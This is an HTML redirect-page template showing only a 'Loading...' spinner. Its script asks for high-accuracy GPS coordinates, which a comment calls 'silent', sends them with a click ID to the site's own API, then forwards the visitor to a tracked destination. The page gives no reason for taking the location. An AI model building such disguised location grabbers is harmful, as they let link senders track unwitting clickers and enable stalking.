<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: white;
        }
        .container {
            text-align: center;
            padding: 2rem;
        }
        .spinner {
            border: 3px solid #f3f4f6;
            border-top: 3px solid #2563eb;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            color: #6b7280;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <p class="message">Loading...</p>
    </div>

    <script>
        const destinationUrl = '{{ $destinationUrl }}';
        const clickEventId = '{{ $clickEventId }}';
        const trackingCode = '{{ $trackingCode }}';
        const apiBaseUrl = window.location.origin;

        // Request GPS location silently
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    // Success - send GPS data to API
                    console.log('GPS captured:', position.coords.latitude, position.coords.longitude);

                    // Use 3 seconds delay for both desktop and mobile
                    const delay = 3000;

                    setTimeout(() => {
                        fetch(`${apiBaseUrl}/api/gps-location`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                click_event_id: clickEventId,
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                            }),
                        })
                            .then(response => {
                                if (response.status === 404) {
                                    return response.json().then(data => {
                                        if (data.retry) {
                                            // Retry after another delay
                                            console.log('Retrying GPS update...');
                                            setTimeout(() => {
                                                fetch(`${apiBaseUrl}/api/gps-location`, {
                                                    method: 'POST',
                                                    headers: {
                                                        'Content-Type': 'application/json',
                                                    },
                                                    body: JSON.stringify({
                                                        click_event_id: clickEventId,
                                                        latitude: position.coords.latitude,
                                                        longitude: position.coords.longitude,
                                                    }),
                                                })
                                                    .then(r => r.json())
                                                    .then(data => {
                                                        console.log('GPS API response (retry):', data);
                                                        setTimeout(() => {
                                                            window.location.href = destinationUrl + '?code=' + trackingCode;
                                                        }, 500);
                                                    })
                                                    .catch(err => {
                                                        console.error('GPS API retry error:', err);
                                                        window.location.href = destinationUrl + '?code=' + trackingCode;
                                                    });
                                            }, delay);
                                        } else {
                                            throw new Error('Click not found');
                                        }
                                    });
                                }
                                return response.json();
                            })
                            .then(data => {
                                console.log('GPS API response:', data);
                                // Redirect after successful GPS update
                                setTimeout(() => {
                                    window.location.href = destinationUrl + '?code=' + trackingCode;
                                }, 500);
                            })
                            .catch(error => {
                                console.error('GPS API error:', error);
                                // Redirect even if API fails
                                window.location.href = destinationUrl + '?code=' + trackingCode;
                            });
                    }, delay);
                },
                (error) => {
                    // Denied or failed - just redirect without GPS
                    console.log('Geolocation denied or failed:', error);
                    window.location.href = destinationUrl + '?code=' + trackingCode;
                },
                {
                    timeout: 20000,
                    maximumAge: 0,
                    enableHighAccuracy: true,
                }
            );
        } else {
            // Geolocation not supported - redirect without GPS
            window.location.href = destinationUrl + '?code=' + trackingCode;
        }
    </script>
</body>
</html>
